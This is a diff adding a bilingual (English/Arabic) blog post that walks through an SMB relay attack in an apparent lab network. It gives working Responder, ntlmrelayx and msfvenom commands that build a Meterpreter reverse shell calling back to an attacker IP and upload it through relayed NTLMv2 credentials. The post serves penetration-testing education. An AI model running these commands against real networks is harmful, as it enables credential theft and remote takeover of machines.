@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Relaying - SMB Relay | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">network-attacks</a><span class="sep">/</span><span>Relaying - SMB Relay</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">network-attacks</span>
+<span class="post-date">2023-12-10</span>
+</div>
+<h1 class="post-title">Relaying - SMB Relay</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>Before reading this article, it is important to review the previous article on LLMNR Poisoning, as the SMB Relay technique builds directly on the concepts covered there.</p>
+<h2>What is SMB Relaying?</h2>
+<p>The idea behind SMB Relaying is similar to what was explained in the LLMNR Poisoning article, but with a few key differences. In this technique, we perform LLMNR Poisoning using the Responder tool to capture the NTLMv2 hash from a victim on the network. However, instead of cracking the hash offline, we pass it directly to the Ntlmrelayx tool. This is the main advantage of SMB Relay -- there is no need to crack the hash at all.</p>
+<p>Ntlmrelayx takes the captured hash and uses it to authenticate via the SMB protocol against all machines on the network. There is one critical requirement for this to work: the target machine must not have SMB2 Signing set as required. If Ntlmrelayx successfully authenticates to one of the target machines, it will upload a malicious file (a Reverse Shell payload) and execute it, giving us a remote session on that machine.</p>
+<h2>Walkthrough</h2>
+<h3>Step 1: Identify Machines Without Required SMB2 Signing</h3>
+<p>The first thing we need to do is determine which machines on the network do not enforce SMB2 Signing. We use CrackMapExec for this purpose.</p>
+<p>After running the scan, we can observe that the machine with an IP address ending in 13 does not have SMB2 Signing set as required, making it a viable target for the relay attack.</p>
+
+<figure class="article-img"><img src="../assets/images/smb-relay/2.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 2: Generate a Malicious Payload</h3>
+<p>Before starting Responder and Ntlmrelayx, we need to create a malicious reverse shell payload using msfvenom. This payload will be uploaded and executed on the target machine if the relay succeeds:</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.117 LPORT=449 -f exe &gt; rev.exe
+</code></pre>
+<p>This generates a 64-bit Meterpreter reverse TCP payload that will connect back to our attacker machine at <code>192.168.100.117</code> on port <code>449</code>.</p>
+<h3>Step 3: Configure Responder</h3>
+<p>Before launching Responder, we need to edit the <code>Responder.conf</code> configuration file. Specifically, we must change the SMB and HTTP server options from <code>On</code> to <code>Off</code>. This is necessary to prevent conflicts between Responder and Ntlmrelayx, since both tools would otherwise try to listen on the same ports for SMB and HTTP traffic. By disabling these in Responder, we allow Ntlmrelayx to handle the SMB relay without interference.</p>
+
+<figure class="article-img"><img src="../assets/images/smb-relay/3.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 4: Launch Responder and Ntlmrelayx</h3>
+<p>Now we start both tools. First, launch Ntlmrelayx, pointing it at a file containing the target IPs (machines without required SMB2 Signing), and specifying our malicious payload:</p>
+<pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf smb.txt -e rev.exe -smb2support
+</code></pre>
+<ul>
+<li><code>-tf smb.txt</code> specifies the target file containing the list of IPs to relay credentials to.</li>
+<li><code>-e rev.exe</code> specifies the executable payload to upload and run on the target.</li>
+<li><code>-smb2support</code> enables SMB2 support for the relay.</li>
+</ul>
+<p>In a second terminal, launch Responder to begin poisoning LLMNR and NBT-NS requests on the network:</p>
+<pre><code class="language-bash">sudo python2 Responder.py -I eth0 -wv
+</code></pre>
+<ul>
+<li><code>-I eth0</code> specifies the network interface to listen on.</li>
+<li><code>-w</code> starts the WPAD rogue proxy server.</li>
+<li><code>-v</code> enables verbose output.</li>
+</ul>
+
+<figure class="article-img"><img src="../assets/images/smb-relay/4.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 5: Wait for a Victim</h3>
+<p>At this point, we wait for a user on the network to trigger a name resolution request that Responder can poison. This happens when someone tries to access a non-existent SMB share (for example, <code>srv1.vuln.local\\secret\\</code>) or navigates to a non-existent website. When this occurs, Responder captures the victim's NTLMv2 hash and passes it to Ntlmrelayx, which relays it to the target machine whose IP ends in 13.</p>
+<h3>Step 6: Successful Relay and Shell</h3>
+<p>After approximately ten minutes of waiting, a user named Khalid searched for a non-existent SMB share. Responder captured Khalid's NTLMv2 hash and forwarded it to Ntlmrelayx. Ntlmrelayx then relayed Khalid's credentials to the target machine (IP ending in 13), successfully authenticated via SMB, uploaded the malicious reverse shell payload, and executed it. This gave us a full Meterpreter session on the compromised machine.</p>
+<figure class="article-img"><img src="../assets/images/smb-relay/5.png" alt="Step 4" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة: قبل البدأ في قراءة هذي المقالة يجب الاطلاع على المقالة السابقة LLMNR Poisoning</p>
+<p>ايش هو الSMB Relaying: الفكرة مشابهة لي المقالة السابقة لكن بفروقات بسيطة يأنه سوف ننفذ تكنيك LLMNR Poisoning عن بأستخدام اداة Responder حتى نلتقط الهاش ومن ثم نمرره الى اداة Ntlmrelayx بدون الحاجة لكسر الهاش وهذا هو الذي يميز هذا التكنيك, وNtlmrelayx سوف تستخدم هذا الهاش وتقوم بتسجيل الدخول فيه عن طريق بروتوكول smb لجميع الاجهزة الموجودة على الشبكة ولكن بشرط يجب ان يكون الـ SMB2 SIGNING ليس متطلب واذا تمكنت من الدخول على احد الاجهزة سوف تقوم برفع ملف ضار ( ـReverse Shell ) خاص بك وتنفيذه</p>
+<p>الشرح:</p>
+<p>في بداية الموضوع يجب علينا معرفة ماهي الاجهزة اللتي ليس لديها متطلب SMB2 SIGNING بأستخدام اداة CrackMapExec</p>
+<p>نلاحظ مع بعض ان الايبي اللذي ينتهي برقم 13 الـSMB2 SIGNING ليست متطلب بالنسبة له</p>
+<figure class="article-img"><img src="../assets/images/smb-relay/2.png" alt="Step 1" loading="lazy"></figure>
+
+<p>الان قبل ابدأ تشغيل اداة Responder وNtlmrelayx راح ننشأ ملف ضار عن بأستخدام اداة msfvenom عن طريق هذا الامر:</p>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.117 LPORT=449 -f exe &gt; rev.exe</p>
+<p>الان سوف نذهب لملف Responder.conf ونقوم بالتعديل عليه وتبديل كلمة On الى Off بالنسبة لي الـsmb و الـhttp حتى لا يحدث تعارض بين اداة Ntlmrelayx و اداة Responder</p>
+<figure class="article-img"><img src="../assets/images/smb-relay/3.png" alt="Step 2" loading="lazy"></figure>
+
+<p>الان راح نشغل اداة Responder واداة Ntlmrelayx بأستخدام هذي الاوامر:</p>
+<p>python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf smb.txt -e rev.exe -smb2support</p>
+<figure class="article-img"><img src="../assets/images/smb-relay/4.png" alt="Step 3" loading="lazy"></figure>
+
+<p>sudo python2 Responder.py -I eth0 -wv</p>
+<p>الان سوف ننتظر حتى يقوم احد الاشخاص على الشبكة بالدخول على smb share غير موجود مثل: srv1.vuln.local\\secret\\\\ او موقع غير موجود حتى نتلقط الـNTLMv2 الخاص فيه وتمريره الى الجهاز اللذي ينتهي الايبي الخاص به برقم 13</p>
+<p>بعد انتظار عشرة دقائق قام المستخدم Khalid بالبحث عن smb share غير موجود وتم تمرير الـNTLMv2 الخاص في المستخدم Khalid الى الجهاز اللذي ينتهي الايبي الخاص به برقم 13 وتم تسجيل الدخول بنجاح ورفع الملف الضار والحصول على جلسة اختراق</p>
+<figure class="article-img"><img src="../assets/images/smb-relay/5.png" alt="Step 4" loading="lazy"></figure>
+
+<p>وصلنا لنهاية المقالة</p>
+<p>شاكر لكم</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
